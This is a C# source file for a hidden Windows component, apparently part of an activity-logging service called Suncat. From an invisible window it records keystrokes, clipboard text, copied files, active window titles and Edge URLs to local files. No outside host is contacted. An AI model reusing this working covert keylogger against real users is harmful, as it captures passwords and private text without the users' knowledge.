using RawInput;
using SHDocVw;
using Shell32;
using SuncatCommon;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Reactive.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Automation;
using System.Windows.Forms;

namespace SuncatHook
{
    public partial class SuncatHook : Form
    {
        private InputDevice id;
        private int NumberOfKeyboards;
        private Thread serverChecker;
        private Thread globalKeyboardHookLogger;
        private Thread globalWindowHookLogger;
        private Thread globalClipboardHookLogger;
        private Thread globalCopyFilesHookLogger;
        private Thread globalEdgeHookLogger;
        private object keyboardDataLock = new object();
        private bool keyboardLoggerSubscribed;
        private string lastActiveWindowTitle;
        private string lastClipboardText;
        private List<string> lastCopiedFiles;
        private Dictionary<int, IOrderedEnumerable<string>> currentEdgeTabList;
        private List<KeyboardLayoutData> keyboardBuffer = new List<KeyboardLayoutData>();
        private IDisposable loggerSubscription;
        private SuncatLog keyboardLog = new SuncatLog();
        private SuncatLog windowLog = new SuncatLog();
        private SuncatLog clipboardLog = new SuncatLog();
        private SuncatLog copyFilesLog = new SuncatLog();
        private SuncatLog edgeLog = new SuncatLog();

        public SuncatHook()
        {
            InitializeComponent();
            
            Application.ApplicationExit += delegate { };

            this.Text = GetProductTitle();
            this.Opacity = 0;
        }

        private void SuncatHook_Load(object sender, EventArgs e)
        {
            this.Visible = false;
            this.ShowInTaskbar = false;
            
            try
            {
                Subscribe();

                var windowHandle = GetForegroundWindow();
                lastActiveWindowTitle = windowHandle != IntPtr.Zero ? GetActiveWindowTitle(windowHandle) : string.Empty;
                lastClipboardText = Clipboard.ContainsText(TextDataFormat.Text) ? Clipboard.GetText(TextDataFormat.Text) : string.Empty;
                lastCopiedFiles = Clipboard.ContainsFileDropList() ? Clipboard.GetFileDropList().Cast<string>().ToList() : new List<string>();
                currentEdgeTabList = new Dictionary<int, IOrderedEnumerable<string>>();

                //var privilegeType = Type.GetType("System.Security.AccessControl.Privilege");
                //object privilege = Activator.CreateInstance(privilegeType, "SeCreateGlobalPrivilege");

                // This is to check if user has the right to create global objects (will have to find another way to do it)
                // Throws InvalidOperationException for now
                //privilegeType.GetMethod("Enable").Invoke(privilege, null);

                serverChecker = new Thread(() => CheckServer());
                serverChecker.IsBackground = true;
                serverChecker.Start();

                globalKeyboardHookLogger = new Thread(() => StartGlobalHookLogger("Keyboard", KeyboardLoggerAction));
                globalKeyboardHookLogger.IsBackground = true;
                globalKeyboardHookLogger.Start();

                globalWindowHookLogger = new Thread(() => StartGlobalHookLogger("Window", WindowLoggerAction));
                globalWindowHookLogger.IsBackground = true;
                globalWindowHookLogger.Start();

                globalClipboardHookLogger = new Thread(() => StartGlobalHookLogger("Clipboard", ClipboardLoggerAction));
                globalClipboardHookLogger.IsBackground = true;
                globalClipboardHookLogger.SetApartmentState(ApartmentState.STA);
                globalClipboardHookLogger.Start();

                globalCopyFilesHookLogger = new Thread(() => StartGlobalHookLogger("CopyFiles", CopyFilesLoggerAction));
                globalCopyFilesHookLogger.IsBackground = true;
                globalCopyFilesHookLogger.SetApartmentState(ApartmentState.STA);
                globalCopyFilesHookLogger.Start();

                globalEdgeHookLogger = new Thread(() => StartGlobalHookLogger("Edge", EdgeLoggerAction));
                globalEdgeHookLogger.IsBackground = true;
                globalEdgeHookLogger.Start();
            }
            catch (Exception ex)
            {
                #if DEBUG
                    Debug.WriteLine(ex);
                    
                    if (ex.InnerException != null)
                        Debug.WriteLine(ex.InnerException);
                #else
                    Trace.WriteLine(ex);

                    if (ex.InnerException != null)
                        Trace.WriteLine(ex.InnerException);
                #endif

                Application.Exit();
            }
        }

        // The WndProc is overridden to allow InputDevice to intercept
        // messages to the window and thus catch WM_INPUT messages
        protected override void WndProc(ref Message message)
        {
            try
            {
                if (id != null)
                {
                    id.ProcessMessage(message);
                }
            }
            catch (Exception ex)
            {
                #if DEBUG
                    Debug.WriteLine(ex);
                    
                    if (ex.InnerException != null)
                        Debug.WriteLine(ex.InnerException);
                #else
                    Trace.WriteLine(ex);

                    if (ex.InnerException != null)
                        Trace.WriteLine(ex.InnerException);
                #endif

                try
                {
                    NumberOfKeyboards = id.EnumerateDevices();

                    if (id != null)
                    {
                        id.ProcessMessage(message);
                    }
                }
                catch (Exception ex2)
                {
                    #if DEBUG
                        Debug.WriteLine(ex2);
                        
                        if (ex2.InnerException != null)
                            Debug.WriteLine(ex2.InnerException);
                    #else
                        Trace.WriteLine(ex2);

                        if (ex2.InnerException != null)
                            Trace.WriteLine(ex2.InnerException);
                    #endif

                    Application.Exit();
                }
            }

            base.WndProc(ref message);
        }

        private string GetProductTitle()
        {
            var productTitle = string.Empty;

            try
            {
                var assembly = Assembly.GetEntryAssembly();

                if (assembly != null)
                {
                    object[] customAttributes = assembly.GetCustomAttributes(typeof(AssemblyTitleAttribute), false);

                    if ((customAttributes != null) && (customAttributes.Length > 0))
                    {
                        productTitle = ((AssemblyTitleAttribute)customAttributes[0]).Title;
                    }

                    if (string.IsNullOrEmpty(productTitle))
                    {
                        productTitle = string.Empty;
                    }
                }
            }
            catch (Exception ex)
            {
                #if DEBUG
                    Debug.WriteLine(ex);
                    
                    if (ex.InnerException != null)
                        Debug.WriteLine(ex.InnerException);
                #else
                    Trace.WriteLine(ex);

                    if (ex.InnerException != null)
                        Trace.WriteLine(ex.InnerException);
                #endif
            }

            return productTitle;
        }

        private IEnumerable<string> GetEdgeTabList(AutomationElement edgeWindow)
        {
            foreach (AutomationElement child in edgeWindow.FindAll(TreeScope.Children,
                new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.ListItem)))
            {
                yield return child.Current.Name;
            }
        }

        private AutomationElement GetEdgeWindow(AutomationElement appWindow)
        {
            return appWindow.FindFirst(TreeScope.Children, new AndCondition(
                new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Window),
                new PropertyCondition(AutomationElement.NameProperty, "Microsoft Edge")));
        }

        public static string GetEdgeUrl(AutomationElement edgeWindow)
        {
            var addressEditBox = edgeWindow.FindFirst(TreeScope.Children,
                new PropertyCondition(AutomationElement.AutomationIdProperty, "addressEditBox"));

            return ((ValuePattern)addressEditBox.GetCurrentPattern(ValuePattern.Pattern)).Current.Value;
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        [DllImport("user32.dll")]
        private static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("kernel32.dll")]
        private static extern bool QueryFullProcessImageName(IntPtr hprocess, int dwFlags, StringBuilder lpExeName, out int size);

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern short VkKeyScanEx(char ch, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        private string GetActiveWindowTitle(IntPtr handle)
        {
            const int count = 256;
            var buffer = new StringBuilder(count);

            if (GetWindowText(handle, buffer, count) > 0)
            {
                return buffer.ToString();
            }

            return null;
        }

        private int GetActiveProcessId(IntPtr handle)
        {
            uint pid;

            GetWindowThreadProcessId(handle, out pid);

            return Convert.ToInt32(pid);
        }

        private string GetExecutablePath(int processId)
        {
            var buffer = new StringBuilder(1024);
            var process = OpenProcess(ProcessAccessFlags.QueryLimitedInformation, false, processId);

            if (process != IntPtr.Zero)
            {
                try
                {
                    int size = buffer.Capacity;

                    if (QueryFullProcessImageName(process, 0, buffer, out size))
                    {
                        return buffer.ToString();
                    }
                }
                finally
                {
                    CloseHandle(process);
                }
            }

            return null;
            //throw new Win32Exception(Marshal.GetLastWin32Error());
        }

        private void AddKeyCodeToBuffer(Keys key)
        {
            byte[] keyboardState = new byte[255];
            bool keyboardStateStatus;

            // Gets the current windows window handle, threadID, processID
            IntPtr currentHWnd = GetForegroundWindow();
            uint currentProcessID;
            uint currentWindowThreadID = GetWindowThreadProcessId(currentHWnd, out currentProcessID);
            // This programs Thread ID
            uint thisProgramThreadId = GetCurrentThreadId();

            // Attach to active thread so we can get that keyboard state
            if (AttachThreadInput(thisProgramThreadId, currentWindowThreadID, true))
            {
                // Current state of the modifiers in keyboard
                keyboardStateStatus = GetKeyboardState(keyboardState);

                // Detach
                AttachThreadInput(thisProgramThreadId, currentWindowThreadID, false);
            }
            else
            {
                // Could not attach, perhaps it is this process?
                keyboardStateStatus = GetKeyboardState(keyboardState);
            }

            if (!keyboardStateStatus)
            {
                return;
            }

            uint virtualKeyCode = (uint)key;
            uint scanCode = MapVirtualKey(virtualKeyCode, 0);
            IntPtr inputLocaleIdentifier = GetKeyboardLayout(currentWindowThreadID);

            if (inputLocaleIdentifier == IntPtr.Zero)
            {
                return;
            }

            var keyboardLayoutData = new KeyboardLayoutData();
            keyboardLayoutData.VirtualKeyCode = virtualKeyCode;
            keyboardLayoutData.ScanCode = scanCode;
            keyboardLayoutData.KeyState = keyboardState;
            keyboardLayoutData.KeyboardLayout = inputLocaleIdentifier;
            keyboardBuffer.Add(keyboardLayoutData);
        }

        private void CheckServer()
        {
            while (true)
            {
                var processes = Process.GetProcessesByName("suncatsvc"); // Release name

                if (processes.Length == 0)
                {
                    processes = Process.GetProcessesByName("SuncatServiceTestApp"); // Debug name

                    if (processes.Length == 0)
                    {
                        Application.Exit();
                    }
                }

                Thread.Sleep(1000);
            }
        }

        private void StartGlobalHookLogger(string type, Action<string, FileStream> loggerAction)
        {
            while (true)
            {
                try
                {
                    bool createdNew;
                    var allowEveryoneRule = new MutexAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), MutexRights.FullControl, AccessControlType.Allow);
                    var mutexSecurity = new MutexSecurity();
                    mutexSecurity.AddAccessRule(allowEveryoneRule);

                    // Need to add user to: Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment\Create global objects
                    // to be able to create global objects, also need to reboot or logon again
                    // To apply the setting: secedit /configure /db secedit.sdb /cfg "suncatprivs.inf" /overwrite /quiet
                    using (var mutex = new Mutex(false, $@"Global\Suncat{type}HookMapMutex", out createdNew, mutexSecurity))
                    {
                        var mapName = $"Suncat{type}HookMap";
                        var dataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SuncatSvc", "Hook");
                        Directory.CreateDirectory(dataDir);

                        while (mutex.WaitOne())
                        {
                            try
                            {
                                using (var fileStream = new FileStream($@"{dataDir}\{mapName}.data", FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                                {
                                    loggerAction(type, fileStream);
                                }
                            }
                            catch (Exception ex)
                            {
                                #if DEBUG
                                    Debug.WriteLine(ex);
                                    
                                    if (ex.InnerException != null)
                                        Debug.WriteLine(ex.InnerException);
                                #else
                                    Trace.WriteLine(ex);

                                    if (ex.InnerException != null)
                                        Trace.WriteLine(ex.InnerException);
                                #endif

                                break;
                            }
                            finally
                            {
                                mutex.ReleaseMutex();
                            }

                            Thread.Sleep(500);
                        }
                    }
                }
                catch (Exception ex)
                {
                    #if DEBUG
                        Debug.WriteLine(ex);
                        
                        if (ex.InnerException != null)
                            Debug.WriteLine(ex.InnerException);
                    #else
                        Trace.WriteLine(ex);

                        if (ex.InnerException != null)
                            Trace.WriteLine(ex.InnerException);
                    #endif
                }

                Thread.Sleep(500);
            }
        }

        private void KeyboardLoggerAction(string mapName, FileStream fileStream)
        {
            if (keyboardLoggerSubscribed)
            {
                lock (keyboardDataLock)
                {
                    using (var memoryStream = new MemoryStream())
                    {
                        var formatter = new BinaryFormatter();

                        formatter.Serialize(memoryStream, keyboardLog);

                        using (var map = MemoryMappedFile.CreateFromFile(fileStream, mapName, memoryStream.Length, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, false))
                        {
                            using (var viewStream = map.CreateViewStream())
                            {
                                keyboardLog.Event = SuncatLogEvent.TypeOnKeyboard;

                                formatter.Serialize(fileStream, keyboardLog);
                                fileStream.Position = 0;

                                keyboardLog.Event = SuncatLogEvent.None;
                                keyboardLog.Data1 = string.Empty;

                                keyboardLoggerSubscribed = false;
                            }
                        }
                    }
                }
            }
        }

        private void WindowLoggerAction(string mapName, FileStream fileStream)
        {
            var currentWindowHandle = GetForegroundWindow();
                
            if (currentWindowHandle != IntPtr.Zero)
            {
                string currentActiveWindowTitle = null;
                var activeProcessFileName = GetActiveProcessId(currentWindowHandle);
                var executablePath = GetExecutablePath(activeProcessFileName);
                var explorer = false;

                if (executablePath != null && executablePath.Equals(@"C:\Windows\explorer.exe", StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        ShellWindows shellWindows = new ShellWindows();

                        foreach (InternetExplorer window in shellWindows)
                        {
                            if (new IntPtr(window.HWND) == currentWindowHandle)
                            {
                                currentActiveWindowTitle = ((IShellFolderViewDual2)window.Document).Folder.Items().Item().Path;

                                // Test if the window title is a valid path because explorer.exe is also used to display non-directory windows like Control Panel stuff, etc
                                if (Regex.IsMatch(currentActiveWindowTitle, @"^([A-Z]:\\|\\\\)", RegexOptions.IgnoreCase))
                                {
                                    explorer = true;
                                }

                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        #if DEBUG
                            Debug.WriteLine(ex);
                            
                            if (ex.InnerException != null)
                                Debug.WriteLine(ex.InnerException);
                        #else
                            Trace.WriteLine(ex);

                            if (ex.InnerException != null)
                                Trace.WriteLine(ex.InnerException);
                        #endif
                    }
                }

                if (!explorer)
                {
                    currentActiveWindowTitle = GetActiveWindowTitle(currentWindowHandle);
                }

                if (currentActiveWindowTitle != lastActiveWindowTitle)
                {
                    using (var memoryStream = new MemoryStream())
                    {
                        var formatter = new BinaryFormatter();

                        formatter.Serialize(memoryStream, windowLog);

                        using (var map = MemoryMappedFile.CreateFromFile(fileStream, mapName, memoryStream.Length, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, false))
                        {
                            using (var viewStream = map.CreateViewStream())
                            {
                                if (explorer)
                                {
                                    if (!string.IsNullOrWhiteSpace(currentActiveWindowTitle))
                                    {
                                        windowLog.Event = SuncatLogEvent.Explorer;
                                        windowLog.Data1 = currentActiveWindowTitle.Trim();
                                        windowLog.Data2 = windowLog.Data3 = null;

                                        formatter.Serialize(fileStream, windowLog);
                                        fileStream.Position = 0;

                                        windowLog.Event = SuncatLogEvent.None;
                                        lastActiveWindowTitle = currentActiveWindowTitle;
                                    }
                                }
                                else
                                {
                                    windowLog.Event = SuncatLogEvent.SwitchApp;
                                    windowLog.Data1 = string.IsNullOrWhiteSpace(currentActiveWindowTitle) ? null : currentActiveWindowTitle.Trim();

                                    if (executablePath != null)
                                    {
                                        windowLog.Data2 = executablePath;

                                        try
                                        {
                                            windowLog.Data3 = FileVersionInfo.GetVersionInfo(executablePath).FileDescription;
                                        }
                                        catch (Exception ex)
                                        {
                                            #if DEBUG
                                                Debug.WriteLine(ex);
                                                
                                                if (ex.InnerException != null)
                                                    Debug.WriteLine(ex.InnerException);
                                            #else
                                                Trace.WriteLine(ex);

                                                if (ex.InnerException != null)
                                                    Trace.WriteLine(ex.InnerException);
                                            #endif
                                        }
                                    }

                                    formatter.Serialize(fileStream, windowLog);
                                    fileStream.Position = 0;

                                    windowLog.Event = SuncatLogEvent.None;
                                    lastActiveWindowTitle = currentActiveWindowTitle;
                                }
                            }
                        }
                    }
                }
            }
        }

        private void ClipboardLoggerAction(string mapName, FileStream fileStream)
        {
            if (Clipboard.ContainsText(TextDataFormat.Text))
            {
                var currentClipboardText = Clipboard.GetText(TextDataFormat.Text);

                if (!string.IsNullOrWhiteSpace(currentClipboardText) && currentClipboardText != lastClipboardText)
                {
                    using (var memoryStream = new MemoryStream())
                    {
                        var formatter = new BinaryFormatter();

                        formatter.Serialize(memoryStream, clipboardLog);

                        using (var map = MemoryMappedFile.CreateFromFile(fileStream, mapName, memoryStream.Length, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, false))
                        {
                            using (var viewStream = map.CreateViewStream())
                            {
                                clipboardLog.Event = SuncatLogEvent.CopyToClipboard;
                                clipboardLog.Data1 = currentClipboardText;

                                formatter.Serialize(fileStream, clipboardLog);
                                fileStream.Position = 0;

                                clipboardLog.Event = SuncatLogEvent.None;
                                lastClipboardText = currentClipboardText;
                            }
                        }
                    }
                }
            }
        }

        private void CopyFilesLoggerAction(string mapName, FileStream fileStream)
        {
            if (Clipboard.ContainsFileDropList())
            {
                var currentCopiedFiles = Clipboard.GetFileDropList().Cast<string>().ToList();

                if (!currentCopiedFiles.SequenceEqual(lastCopiedFiles))
                {
                    using (var memoryStream = new MemoryStream())
                    {
                        var formatter = new BinaryFormatter();

                        formatter.Serialize(memoryStream, copyFilesLog);

                        using (var map = MemoryMappedFile.CreateFromFile(fileStream, mapName, memoryStream.Length, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, false))
                        {
                            using (var viewStream = map.CreateViewStream())
                            {
                                var currentCopiedFilesInfo = new List<SuncatFileInfo>();
                                
                                foreach (var copiedFile in currentCopiedFiles)
                                {
                                    var fileInfo = new FileInfo(copiedFile);
                                    currentCopiedFilesInfo.Add(new SuncatFileInfo() { FileInfo = fileInfo, IsDirectory = fileInfo.Attributes.HasFlag(FileAttributes.Directory) });
                                }

                                copyFilesLog.Event = SuncatLogEvent.CopyFile;
                                copyFilesLog.DataObject = currentCopiedFilesInfo;

                                formatter.Serialize(fileStream, copyFilesLog);
                                fileStream.Position = 0;

                                copyFilesLog.Event = SuncatLogEvent.None;
                                lastCopiedFiles = currentCopiedFiles;
                            }
                        }
                    }
                }
            }
        }

        private void EdgeLoggerAction(string mapName, FileStream fileStream)
        {
            try
            {
                var main = AutomationElement.FromHandle(GetDesktopWindow());

                var edgeWindowHandleList = new List<int>();

                foreach (AutomationElement appWindow in main.FindAll(TreeScope.Children, Condition.TrueCondition))
                {
                    try
                    {
                        var window = GetEdgeWindow(appWindow);

                        if (window != null)
                        {
                            edgeWindowHandleList.Add(window.Current.NativeWindowHandle);

                            if (!currentEdgeTabList.ContainsKey(window.Current.NativeWindowHandle))
                            {
                                currentEdgeTabList.Add(
                                    window.Current.NativeWindowHandle,
                                    GetEdgeTabList(window).ToList().AsEnumerable().OrderBy(x => x));
                            }

                            var tabList = GetEdgeTabList(window).ToList().AsEnumerable().OrderBy(x => x);

                            if (!currentEdgeTabList[window.Current.NativeWindowHandle].SequenceEqual(tabList)
                                && tabList.Count() >= currentEdgeTabList[window.Current.NativeWindowHandle].Count())
                            {
                                var title =
                                    currentEdgeTabList[window.Current.NativeWindowHandle]
                                        .Aggregate(tabList.ToList(),
                                            (l, e) => { l.Remove(e); return l; })
                                                .FirstOrDefault();

                                if (title != null)
                                {
                                    var url = GetEdgeUrl(window);

                                    if (!string.IsNullOrWhiteSpace(url))
                                    {
                                        using (var memoryStream = new MemoryStream())
                                        {
                                            var formatter = new BinaryFormatter();

                                            formatter.Serialize(memoryStream, edgeLog);

                                            using (var map = MemoryMappedFile.CreateFromFile(fileStream, mapName, memoryStream.Length, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, false))
                                            {
                                                using (var viewStream = map.CreateViewStream())
                                                {
                                                    edgeLog.Event = SuncatLogEvent.OpenURL;
                                                    edgeLog.Data1 = url;
                                                    edgeLog.Data2 = title;
                                                    edgeLog.Data3 = "Edge";

                                                    formatter.Serialize(fileStream, edgeLog);
                                                    fileStream.Position = 0;

                                                    edgeLog.Event = SuncatLogEvent.None;
                                                }
                                            }
                                        }
                                    }
                                }
                            }

                            currentEdgeTabList[window.Current.NativeWindowHandle] = tabList;
                        }
                    }
                    catch (Exception ex)
                    {
                        #if DEBUG
                            Debug.WriteLine(ex);
                            
                            if (ex.InnerException != null)
                                Debug.WriteLine(ex.InnerException);
                        #else
                            Trace.WriteLine(ex);

                            if (ex.InnerException != null)
                                Trace.WriteLine(ex.InnerException);
                        #endif
                    }
                }

                foreach (var edgeTabList in currentEdgeTabList)
                {
                    if (!edgeWindowHandleList.Contains(edgeTabList.Key))
                    {
                        currentEdgeTabList.Remove(edgeTabList.Key);
                    }
                }
            }
            catch (Exception ex)
            {
                #if DEBUG
                    Debug.WriteLine(ex);
                    
                    if (ex.InnerException != null)
                        Debug.WriteLine(ex.InnerException);
                #else
                    Trace.WriteLine(ex);

                    if (ex.InnerException != null)
                        Trace.WriteLine(ex.InnerException);
                #endif
            }
        }

        private void SubscribeKeyboardLogger()
        {
            loggerSubscription =
                Observable.Timer(TimeSpan.FromSeconds(5))
                    .Subscribe(
                        x =>
                        {
                            lock (keyboardDataLock)
                            {
                                //keyboardLog.Data1 = Regex.Replace(keyboardLog.Data1, @"\s+", " ").Trim();

                                //if (!string.IsNullOrWhiteSpace(keyboardLog.Data1))
                                if (keyboardBuffer.Count() > 0)
                                {
                                    //var keys = keyboardLog.Data1;
                                    keyboardLog.Data1 = string.Empty;

                                    foreach (var keyData in keyboardBuffer)
                                    {
                                        string specialKeys = null;
                                        string keyStr = null;
                                        StringBuilder result = new StringBuilder();

                                        try
                                        {
                                            // Skip dead keys.
                                            if (ToUnicodeEx(keyData.VirtualKeyCode, keyData.ScanCode, keyData.KeyState, result, (int)5, (uint)0, keyData.KeyboardLayout) == -1)
                                                continue;

                                            keyStr = result.ToString();

                                            foreach (var key in keyStr)
                                            {
                                                //if (string.IsNullOrEmpty(key))
                                                //{
                                                //    // We still have a problem when special key is repeated and when we use caps, it displays too many ShiftKeys, etc.
                                                //    // So we ignore them for now.
                                                //    //keyboardLog.Data1 += "{" + e.Keyboard.vKey + "}";
                                                //}
                                                //else
                                                //{
                                                //    keyboardLog.Data1 += key;
                                                //}

                                                if (char.IsControl(key))
                                                {
                                                    specialKeys = GetKeysFromChar(key).ToString();
                                                }
                                            }
                                        }
                                        catch (Exception ex)
                                        {
                                            #if DEBUG
                                                Debug.WriteLine(ex);
                                                
                                                if (ex.InnerException != null)
                                                    Debug.WriteLine(ex.InnerException);
                                            #else
                                                Trace.WriteLine(ex);

                                                if (ex.InnerException != null)
                                                    Trace.WriteLine(ex.InnerException);
                                            #endif
                                        }

                                        if (!string.IsNullOrEmpty(keyStr))
                                        {
                                            foreach (var key in keyStr)
                                            {
                                                keyboardLog.Data1 += char.IsControl(key) && !string.IsNullOrWhiteSpace(specialKeys) ? "{" + specialKeys + "}" : key.ToString();
                                            }

                                            keyboardLoggerSubscribed = true;
                                        }
                                    }

                                    keyboardBuffer.Clear();
                                }
                            }
                        });
        }

        private void Subscribe()
        {
            id = new InputDevice(Handle);
            NumberOfKeyboards = id.EnumerateDevices();
            id.KeyPressed += new InputDevice.DeviceEventHandler(RawInput_KeyPressed);
        }

        private Keys GetKeysFromChar(char c)
        {
            Keys keys;
            short keyCode = VkKeyScanEx(c, InputLanguage.CurrentInputLanguage.Handle);

            if (keyCode == -1)
            {
                keys = Keys.None;
            }
            else
            {
                keys = (Keys)(((keyCode & 0xFF00) << 8) | (keyCode & 0xFF));
            }

            return keys;
        }

        private void RawInput_KeyPressed(object sender, InputDevice.KeyControlEventArgs e)
        {
            lock (keyboardDataLock)
            {
                if (loggerSubscription != null)
                {
                    loggerSubscription.Dispose();
                }

                try
                {
                    var key = (Keys)e.Keyboard.key;
                    AddKeyCodeToBuffer(key);
                }
                catch (Exception ex)
                {
                    #if DEBUG
                        Debug.WriteLine(ex);
                        
                        if (ex.InnerException != null)
                            Debug.WriteLine(ex.InnerException);
                    #else
                        Trace.WriteLine(ex);

                        if (ex.InnerException != null)
                            Trace.WriteLine(ex.InnerException);
                    #endif
                }

                SubscribeKeyboardLogger();
            }
        }

        private class KeyboardLayoutData
        {
            public uint VirtualKeyCode { get; set; }
            public uint ScanCode { get; set; }
            public byte[] KeyState { get; set; }
            public IntPtr KeyboardLayout { get; set; }
        }
    }
}
